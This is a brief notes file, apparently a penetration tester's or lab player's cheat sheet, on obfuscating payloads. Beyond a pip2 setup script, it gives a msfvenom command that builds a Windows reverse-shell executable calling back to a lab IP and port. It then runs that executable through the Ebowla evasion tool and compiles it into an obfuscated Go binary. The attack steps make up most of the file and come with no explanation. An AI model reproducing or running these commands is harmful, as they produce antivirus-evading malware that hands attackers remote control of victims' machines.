# Obfuscations
need python2 pip2

#!/bin/bash

echo "Setting up pip2"
mkdir scripts && cd scripts
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
echo "Enter Sudo password is asked"
sleep 2
sudo python2 get-pip.py
pip2 install --upgrade setuptools
sudo apt-get install python-dev -y 
clear
echo "----------"
echo "DONE!!!"
echo "----------"

#ebowla

https://github.com/Genetic-Malware/Ebowla.git

https://github.com/ohoph/3bowla

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=9002 -f exe -a x64 -o reverse_9002.exe

python2 ebowla.py reverse_9002.exe genetic.config

./build_x64_go.sh output/go_symmetric_reverse_9002.exe.go rev_shell_9002.exe

wget https://golang.org/dl/go1.15.2.linux-amd64.tar.gz

tar -C /usr/local -xzf go1.15.2.linux-amd64.tar.gz to extract it.

export PATH=$PATH:/usr/local/go/bin
